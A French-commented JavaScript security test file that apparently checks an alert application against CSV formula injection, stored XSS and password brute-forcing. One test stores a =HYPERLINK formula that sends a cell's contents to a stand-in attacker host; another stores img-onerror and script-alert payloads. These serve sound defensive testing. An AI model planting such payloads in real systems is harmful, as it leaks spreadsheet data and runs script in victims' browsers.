// Injection dans les sorties (CWE-1236, injection de formule CSV ; CWE-79) : le suivi exporté s'ouvre dans un tableur.
import { test } from "node:test";
import assert from "node:assert/strict";
import { preparer, fxao } from "../commun.mjs";

test("IN-FX-13 — une formule dans le titre d'une alerte n'est pas exécutée par le tableur (export CSV)", async () => {
  const coord = await fxao(await preparer(), "coord.urgence");
  const titre = `=HYPERLINK("https://attaquant.exemple/?"&A1,"Cliquer") ${Date.now()}`;
  const envoi = await coord("POST", "/api/alertes", { corps: { titre, corps: "x", priorite: "information", personnes: ["inf.roy"] } });
  assert.equal(envoi.statut, 201, envoi.texte.slice(0, 200));
  const csv = await coord("GET", "/api/alertes/envoyees/export?format=csv");
  assert.equal(csv.statut, 200);
  const ligne = csv.texte.split(/\r?\n/).find((l) => l.includes("attaquant.exemple"));
  assert.ok(ligne, "l'alerte figure à l'export");
  assert.ok(!/(^|[;,])"?=/.test(ligne), `une cellule commence par « = » : ${ligne.slice(0, 160)}`);
});

test("IN-FX-14 — une balise dans une alerte revient comme donnée, jamais servie en HTML", async () => {
  const coord = await fxao(await preparer(), "coord.urgence");
  const envoi = await coord("POST", "/api/alertes", { corps: { titre: "<img src=x onerror=alert(1)>", corps: "<script>alert(1)</script>", priorite: "information", personnes: ["inf.roy"] } });
  assert.equal(envoi.statut, 201);
  const lue = await coord("GET", `/api/alertes/envoyees/${envoi.json.id}`);
  assert.match(lue.entetes["content-type"] ?? "", /application\/json/);
  assert.equal(lue.entetes["x-content-type-options"], "nosniff");
  assert.match(lue.entetes["content-security-policy"] ?? "", /default-src 'none'/);
});

test("IN-FX-15 — la connexion se verrouille après des échecs répétés sur un compte FX-AO", async () => {
  const etat = await preparer();
  const { appel } = await import("../commun.mjs");
  let dernier = 0;
  for (let i = 0; i < 12; i++) {
    dernier = (await appel("POST", "/api/auth/login", { corps: { username: "inh.bergeron", password: `faux-${i}`, tenantId: etat.fx } })).statut;
  }
  assert.ok([423, 429, 403].includes(dernier), `après 12 échecs : ${dernier}`);
});
